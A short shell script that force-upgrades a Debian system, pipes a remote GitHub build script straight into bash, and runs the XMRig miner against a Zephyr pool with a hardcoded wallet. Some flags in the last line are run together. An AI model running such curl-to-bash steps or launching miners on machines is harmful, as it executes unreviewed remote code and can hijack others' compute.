export DEBIAN_FRONTEND=noninteractive
sudo apt-get -qq update
sudo apt-get -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" -y --force-yes upgrade
sudo apt-get install -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" -y --force-yes curl ca-certificates
curl https://raw.githubusercontent.com/HighVoltage557/XmrigonAndroid/main/compile.sh | bash -s -- -y Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
cd xmrig/build
./xmrig -o 	us-zephyr.miningocean.org:5332 -u ZEPHYR2mdUdNFbRWWNZGwy8VnFcyX8FzeZqY2xzybsDrCeoi3ewChSV8HMKne5Q9mQ3DvCDqPBREDHws32WK6DacTrwSDShNgMz29 -p bmw1 -a rx/0-k-t 10
